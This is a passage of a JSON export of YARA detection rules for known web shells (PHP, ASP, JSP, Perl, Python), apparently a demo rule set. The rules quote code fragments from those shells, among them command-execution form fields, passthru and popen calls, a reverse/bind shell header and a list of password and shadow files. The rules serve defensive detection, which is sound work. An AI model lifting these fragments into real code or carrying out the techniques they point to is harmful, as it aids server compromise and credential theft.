them\n}","date":"2014-03-29 12:28:11","description":"Semi-Auto-generated - file mysql.php.php.txt","minimum_yara":"1.7","name":"Webshell_mysql_php_php_RID302A","reference":"-","required_modules":[],"rule_hash":"fec8ad70a2458b33bcabb3d1551fffd9","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_Worse_Linux_Shell_php_RID3323 : DEMO LINUX T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file Worse Linux Shell.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 14:35:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, LINUX, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"print \\\"<tr><td><b>Server is:</b></td><td>\\\".$_SERVER['SERVER_SIGNATURE'].\\\"</td\" \n      $s2 = \"print \\\"<tr><td><b>Execute command:</b></td><td><input size=100 name=\\\\\\\"_cmd\" \n   condition: \n      1 of them\n}","date":"2014-03-29 14:35:01","description":"Semi-Auto-generated - file Worse Linux Shell.php.txt","minimum_yara":"1.7","name":"Webshell_Worse_Linux_Shell_php_RID3323","reference":"-","required_modules":[],"rule_hash":"0c45de75272c42db9e783d417cace562","score":75,"tags":["T1100","DEMO","LINUX","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_cyberlords_sql_php_php_RID33DC : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file cyberlords_sql.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 15:05:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Coded by n0 [nZer0]\" \n      $s1 = \" www.cyberlords.net\" \n      $s2 = \"U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAAMUExURf///wAAAJmZzAAAACJoURkAAAAE\" \n      $s3 = \"return \\\"<BR>Dump error! Can't write to \\\".htmlspecialchars($file);\" \n   condition: \n      1 of them\n}","date":"2014-03-29 15:05:51","description":"Semi-Auto-generated - file cyberlords_sql.php.php.txt","minimum_yara":"1.7","name":"Webshell_cyberlords_sql_php_php_RID33DC","reference":"-","required_modules":[],"rule_hash":"ba8a510b4de92ef4cf7ab015674499be","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_pws_php_php_RID2F4E : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file pws.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 11:51:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<div align=\\\"left\\\"><font size=\\\"1\\\">Input command :</font></div>\" fullword\n      $s1 = \"<input type=\\\"text\\\" name=\\\"cmd\\\" size=\\\"30\\\" class=\\\"input\\\"><br>\" fullword\n      $s4 = \"<input type=\\\"text\\\" name=\\\"dir\\\" size=\\\"30\\\" value=\\\"<? passthru(\\\"pwd\\\"); ?>\" \n   condition: \n      2 of them\n}","date":"2014-03-29 11:51:31","description":"Semi-Auto-generated - file pws.php.php.txt","minimum_yara":"1.7","name":"Webshell_pws_php_php_RID2F4E","reference":"-","required_modules":[],"rule_hash":"be11b634606769c76147e4a5c7e28c60","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_Ayyildiz_Tim___AYT__Shell_v_2_1_Biz_html_RID39CD : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file Ayyildiz Tim  -AYT- Shell v 2.1 Biz.html.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 19:19:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Ayyildiz\" \n      $s1 = \"TouCh By iJOo\" \n      $s2 = \"First we check if there has been asked for a working directory\" \n      $s3 = \"http://ayyildiz.org/images/whosonline2.gif\" \n   condition: \n      2 of them\n}","date":"2014-03-29 19:19:21","description":"Semi-Auto-generated - file Ayyildiz Tim  -AYT- Shell v 2.1 Biz.html.txt","minimum_yara":"1.7","name":"Webshell_Ayyildiz_Tim___AYT__Shell_v_2_1_Biz_html_RID39CD","reference":"-","required_modules":[],"rule_hash":"d3b0d31d04723d2407bc273d51288458","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_Ajax_PHP_Command_Shell_php_RID348D : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file Ajax_PHP Command Shell.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 15:35:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"newhtml = '<b>File browser is under construction! Use at your own risk!</b> <br>\" \n      $s2 = \"Empty Command..type \\\\\\\"shellhelp\\\\\\\" for some ehh...help\" \n      $s3 = \"newhtml = '<font size=0><b>This will reload the page... :(</b><br><br><form enct\" \n   condition: \n      1 of them\n}","date":"2014-03-29 15:35:21","description":"Semi-Auto-generated - file Ajax_PHP Command Shell.php.txt","minimum_yara":"1.7","name":"Webshell_Ajax_PHP_Command_Shell_php_RID348D","reference":"-","required_modules":[],"rule_hash":"fbfeda165a7c223e59fd3cedd9cc74c1","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_JspWebshell_1_2_jsp_RID31D6 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file JspWebshell 1.2.jsp.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 13:39:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"JspWebshell\" \n      $s1 = \"CreateAndDeleteFolder is error:\" \n      $s2 = \"<td width=\\\"70%\\\" height=\\\"22\\\">&nbsp;<%=env.queryHashtable(\\\"java.c\" \n      $s3 = \"String _password =\\\"111\\\";\" \n   condition: \n      2 of them\n}","date":"2014-03-29 13:39:31","description":"Semi-Auto-generated - file JspWebshell 1.2.jsp.txt","minimum_yara":"1.7","name":"Webshell_JspWebshell_1_2_jsp_RID31D6","reference":"-","required_modules":[],"rule_hash":"ffb152623a412aedd48df3343bc1ac79","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_Sincap_php_php_RID3052 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file Sincap.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:34:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"$baglan=fopen(\\\"/tmp/$ekinci\\\",'r');\" \n      $s2 = \"$tampon4=$tampon3-1\" \n      $s3 = \"@aventgrup.net\" \n   condition: \n      2 of them\n}","date":"2014-03-29 12:34:51","description":"Semi-Auto-generated - file Sincap.php.php.txt","minimum_yara":"1.7","name":"Webshell_Sincap_php_php_RID3052","reference":"-","required_modules":[],"rule_hash":"e5cc523957637149a0a094a134d2ca3e","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_Test_php_php_RID2F94 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file Test.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:03:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"$yazi = \\\"test\\\" . \\\"\\\\r\\\\n\\\";\" fullword\n      $s2 = \"fwrite ($fp, \\\"$yazi\\\");\" fullword\n      $s3 = \"$entry_line=\\\"HACKed by EntriKa\\\";\" fullword\n   condition: \n      1 of them\n}","date":"2014-03-29 12:03:11","description":"Semi-Auto-generated - file Test.php.php.txt","minimum_yara":"1.7","name":"Webshell_Test_php_php_RID2F94","reference":"-","required_modules":[],"rule_hash":"575d6621bd1ac5ce7b8265751c43e4f3","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_Phyton_Shell_py_RID30C7 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file Phyton Shell.py.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:54:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"sh_out=os.popen(SHELL+\\\" \\\"+cmd).readlines()\" fullword\n      $s2 = \"#   d00r.py 0.3a (reverse|bind)-shell in python by fQ\" fullword\n      $s3 = \"print \\\"error; help: head -n 16 d00r.py\\\"\" fullword\n      $s4 = \"print \\\"PW:\\\",PW,\\\"PORT:\\\",PORT,\\\"HOST:\\\",HOST\" fullword\n   condition: \n      1 of them\n}","date":"2014-03-29 12:54:21","description":"Semi-Auto-generated - file Phyton Shell.py.txt","minimum_yara":"1.7","name":"Webshell_Phyton_Shell_py_RID30C7","reference":"-","required_modules":[],"rule_hash":"4388daa4cbc7f63d463150b9ce124df3","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_mysql_tool_php_php_RID3247 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file mysql_tool.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 13:58:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"$error_text = '<strong>Failed selecting database \\\"'.$this->db['\" \n      $s1 = \"$ra44  = rand(1,99999);$sj98 = \\\"sh-$ra44\\\";$ml = \\\"$sd98\\\";$a5 = $_SERV\" \n      $s4 = \"<div align=\\\"center\\\">The backup process has now started<br \" \n   condition: \n      1 of them\n}","date":"2014-03-29 13:58:21","description":"Semi-Auto-generated - file mysql_tool.php.php.txt","minimum_yara":"1.7","name":"Webshell_mysql_tool_php_php_RID3247","reference":"-","required_modules":[],"rule_hash":"b5a9a1972df53fd74b9389e02efd4545","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_Zehir_4_asp_RID2EDE : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file Zehir 4.asp.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 11:32:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"</a><a href='\\\"&dosyapath&\\\"?status=10&dPath=\\\"&f1.path&\\\"&path=\\\"&path&\\\"&Time=\" \n      $s4 = \"<input type=submit value=\\\"Test Et!\\\" onclick=\\\"\" \n   condition: \n      1 of them\n}","date":"2014-03-29 11:32:51","description":"Semi-Auto-generated - file Zehir 4.asp.txt","minimum_yara":"1.7","name":"Webshell_Zehir_4_asp_RID2EDE","reference":"-","required_modules":[],"rule_hash":"e15d702876107fd0881539486635eea7","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_sh_php_php_RID2ECF : DEMO T1087 T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file sh.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 11:30:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1087, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$ar_file=array('/etc/passwd','/etc/shadow','/etc/master.passwd','/etc/fstab','/e\" \n      $s2 = \"Show <input type=text size=5 value=\\\".((isset($_POST['br_st']))?$_POST['br_st']:\" \n   condition: \n      1 of them\n}","date":"2014-03-29 11:30:21","description":"Semi-Auto-generated - file sh.php.php.txt","minimum_yara":"1.7","name":"Webshell_sh_php_php_RID2ECF","reference":"-","required_modules":[],"rule_hash":"e01c8646407e3f4678e9b5fd16facd9e","score":75,"tags":["T1100","DEMO","WEBSHELL","T1087"]},{"author":"Florian Roth","content":"rule Webshell_phpbackdoor15_php_RID3140 : DEMO MAL T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file phpbackdoor15.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 13:14:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, MAL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"echo \\\"fichier telecharge dans \\\".good_link(\\\"./\\\".$_FILES[\\\"fic\\\"][\\\"na\" \n      $s2 = \"if(move_uploaded_file($_FILES[\\\"fic\\\"][\\\"tmp_name\\\"],good_link(\\\"./\\\".$_FI\" \n      $s3 = \"echo \\\"Cliquez sur un nom de fichier pour lancer son telechargement. Cliquez s\" \n   condition: \n      1 of them\n}","date":"2014-03-29 13:14:31","description":"Semi-Auto-generated - file phpbackdoor15.php.txt","minimum_yara":"1.7","name":"Webshell_phpbackdoor15_php_RID3140","reference":"-","required_modules":[],"rule_hash":"a07874355143ea871ead29c9e6c48916","score":75,"tags":["T1100","DEMO","WEBSHELL","MAL"]},{"author":"Florian Roth","content":"rule Webshell_phpjackal_php_RID2FFB : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file phpjackal.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:20:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"$dl=$_REQUEST['downloaD'];\" \n      $s4 = \"else shelL(\\\"perl.exe $name $port\\\");\" \n   condition: \n      1 of them\n}","date":"2014-03-29 12:20:21","description":"Semi-Auto-generated - file phpjackal.php.txt","minimum_yara":"1.7","name":"Webshell_phpjackal_php_RID2FFB","reference":"-","required_modules":[],"rule_hash":"942b41fe182c956ce17d8694f40a1295","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_sql_php_php_RID2F44 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file sql.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 11:49:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"fputs ($fp, \\\"# RST MySQL tools\\\\r\\\\n# Home page: http://rst.void.ru\\\\r\\\\n#\" \n      $s2 = \"http://rst.void.ru\" \n      $s3 = \"print \\\"<a href=\\\\\\\"$_SERVER[PHP_SELF]?s=$s&login=$login&passwd=$passwd&\" \n   condition: \n      1 of them\n}","date":"2014-03-29 11:49:51","description":"Semi-Auto-generated - file sql.php.php.txt","minimum_yara":"1.7","name":"Webshell_sql_php_php_RID2F44","reference":"-","required_modules":[],"rule_hash":"310b671f2fdcdceaa54d34e74c106af8","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_cgi_python_py_RID3022 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file cgi-python.py.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:26:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"a CGI by Fuzzyman\" \n      $s1 = \"\\\"\\\"\\\"+fontline +\\\"Version : \\\" + versionstring + \\\"\\\"\\\", Running on : \\\"\\\"\\\" + \" \n      $s2 = \"values = map(lambda x: x.value, theform[field])     # allows for\" \n   condition: \n      1 of them\n}","date":"2014-03-29 12:26:51","description":"Semi-Auto-generated - file cgi-python.py.txt","minimum_yara":"1.7","name":"Webshell_cgi_python_py_RID3022","reference":"-","required_modules":[],"rule_hash":"d81ef24a1d5264043dc027f51d83c093","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_DTool_Pro_php_RID2FBF : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file DTool Pro.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:10:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"r3v3ng4ns\\\\nDigite\" \n      $s1 = \"if(!@opendir($chdir)) $ch_msg=\\\"dtool: line 1: chdir: It seems that the permissi\" \n      $s3 = \"if (empty($cmd) and $ch_msg==\\\"\\\") echo (\\\"Comandos Exclusivos do DTool Pro\\\\n\" \n   condition: \n      1 of them\n}","date":"2014-03-29 12:10:21","description":"Semi-Auto-generated - file DTool Pro.php.txt","minimum_yara":"1.7","name":"Webshell_DTool_Pro_php_RID2FBF","reference":"-","required_modules":[],"rule_hash":"8a9f14ff23d04617165a2134803a9fd7","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_telnetd_pl_RID2ED1 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file telnetd.pl.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 11:30:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"0ldW0lf\" fullword\n      $s1 = \"However you are lucky :P\" \n      $s2 = \"I'm FuCKeD\" \n      $s3 = \"ioctl($CLIENT{$client}->{shell}, &TIOCSWINSZ, $winsize);#\" \n      $s4 = \"atrix@irc.brasnet.org\" \n   condition: \n      1 of them\n}","date":"2014-03-29 11:30:41","description":"Semi-Auto-generated - file telnetd.pl.txt","minimum_yara":"1.7","name":"Webshell_telnetd_pl_RID2ED1","reference":"-","required_modules":[],"rule_hash":"eee6760bf5a9f11145c5dc7008692d85","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_ru24_post_sh_php_php_RID32A0 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file ru24_post_sh.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 14:13:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<title>Ru24PostWebShell - \\\".$_POST['cmd'].\\\"</title>\" fullword\n      $s3 = \"if ((!$_POST['cmd']) || ($_POST['cmd']==\\\"\\\")) { $_POST['cmd']=\\\"id;pwd;uname -a\" \n      $s4 = \"Writed by DreAmeRz\" fullword\n   condition: \n      1 of them\n}","date":"2014-03-29 14:13:11","description":"Semi-Auto-generated - file ru24_post_sh.php.php.txt","minimum_yara":"1.7","name":"Webshell_ru24_post_sh_php_php_RID32A0","reference":"-","required_modules":[],"rule_hash":"a675dfafaa10712724c493a62908a59a","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_php_include_w_shell_php_RID3425 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file php-include-w-shell.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 15:18:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"$dataout .= \\\"<td><a href='$MyLoc?$SREQ&incdbhost=$myhost&incdbuser=$myuser&incd\" \n      $s1 = \"if($run == 1 && $phpshellapp && $phpshellhost && $phpshellport) $strOutput .= DB\" \n   condition: \n      1 of them\n}","date":"2014-03-29 15:18:01","description":"Semi-Auto-generated - file php-include-w-shell.php.txt","minimum_yara":"1.7","name":"Webshell_php_include_w_shell_php_RID3425","reference":"-","required_modules":[],"rule_hash":"8aaf2cf4575288addafd226fcc6bd0ab","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_Safe0ver_Shell__Safe_Mod_Bypass_By_Evilc0der_php_RID3D04 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file Safe0ver Shell -Safe Mod Bypass By Evilc0der.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 21:36:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Safe0ver\" fullword\n      $s1 = \"Script Gecisi Tamamlayamadi!\" \n      $s2 = \"document.write(unescape('%3C%68%74%6D%6C%3E%3C%62%6F%64%79%3E%3C%53%43%52%49%50%\" \n   condition: \n      1 of them\n}","date":"2014-03-29 21:36:31","description":"Semi-Auto-generated - file Safe0ver Shell -Safe Mod Bypass By Evilc0der.php.txt","minimum_yara":"1.7","name":"Webshell_Safe0ver_Shell__Safe_Mod_Bypass_By_Evilc0der_php_RID3D04","reference":"-","required_modules":[],"rule_hash":"5d4914a5634d049554b64b5f16965c94","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_shell_php_php_RID300C : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file shell.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:23:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"/* We have found the parent dir. We must be carefull if the parent \" fullword\n      $s2 = \"$tmpfile = tempnam('/tmp', 'phpshell');\" \n      $s3 = \"if (ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $command, $regs)) {\" fullword\n   condition: \n      1 of them\n}","date":"2014-03-29 12:23:11","description":"Semi-Auto-generated - file shell.php.php.txt","minimum_yara":"1.7","name":"Webshell_shell_php_php_RID300C","reference":"-","required_modules":[],"rule_hash":"272a8811ce64e09ddc615de3973d53b6","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_telnet_cgi_RID2EC4 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file telnet.cgi.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 11:28:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"W A R N I N G: Private Server\" \n      $s2 = \"print \\\"Set-Cookie: SAVEDPWD=;\\\\n\\\"; # remove password cookie\" \n      $s3 = \"$Prompt = $WinNT ? \\\"$CurrentDir> \\\" : \\\"[admin\\\\@$ServerName $C\" \n   condition: \n      1 of them\n}","date":"2014-03-29 11:28:31","description":"Semi-Auto-generated - file telnet.cgi.txt","minimum_yara":"1.7","name":"Webshell_telnet_cgi_RID2EC4","reference":"-","required_modules":[],"rule_hash":"caa1f6ec7d8cb95421c74829761537f7","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_ironshell_php_RID301D : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file ironshell.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:26:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"www.ironwarez.info\" \n      $s1 = \"$cookiename = \\\"wieeeee\\\";\" \n      $s2 = \"~ Shell I\" \n      $s3 = \"www.rootshell-team.info\" \n      $s4 = \"setcookie($cookiename, $_POST['pass'], time()+3600);\" \n   condition: \n      1 of them\n}","date":"2014-03-29 12:26:01","description":"Semi-Auto-generated - file ironshell.php.txt","minimum_yara":"1.7","name":"Webshell_ironshell_php_RID301D","reference":"-","required_modules":[],"rule_hash":"0c8d0b6b3b8100959d754b19fb3d9f13","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_backdoorfr_php_RID306A : DEMO MAL T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file backdoorfr.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:38:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, MAL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"www.victime.com/index.php?page=http://emplacement_de_la_backdoor.php , ou en tan\" \n      $s2 = \"print(\\\"<br>Provenance du mail : <input type=\\\\\\\"text\\\\\\\" name=\\\\\\\"provenanc\" \n   condition: \n      1 of them\n}","date":"2014-03-29 12:38:51","description":"Semi-Auto-generated - file backdoorfr.php.txt","minimum_yara":"1.7","name":"Webshell_backdoorfr_php_RID306A","reference":"-","required_modules":[],"rule_hash":"106ce8c20763c9c102802d965841e9ea","score":75,"tags":["T1100","DEMO","WEBSHELL","MAL"]},{"author":"Florian Roth","content":"rule Webshell_aspydrv_asp_RID2F52 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file aspydrv.asp.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 11:52:11\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"If mcolFormElem.Exists(LCase(sIndex)) Then Form = mcolFormElem.Item(LCase(sIndex))\" \n      $s1 = \"password\" \n      $s2 = \"session(\\\"shagman\\\")=\" \n   condition: \n      2 of them\n}","date":"2014-03-29 11:52:11","description":"Semi-Auto-generated - file aspydrv.asp.txt","minimum_yara":"1.7","name":"Webshell_aspydrv_asp_RID2F52","reference":"-","required_modules":[],"rule_hash":"46c92548c6802f51b4f5f6c48da467ea","score":60,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_cmdjsp_jsp_RID2ED3 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file cmdjsp.jsp.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 11:31:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"// note that linux = cmd and windows = \\\"cmd.exe /c + cmd\\\" \" fullword\n      $s1 = \"Process p = 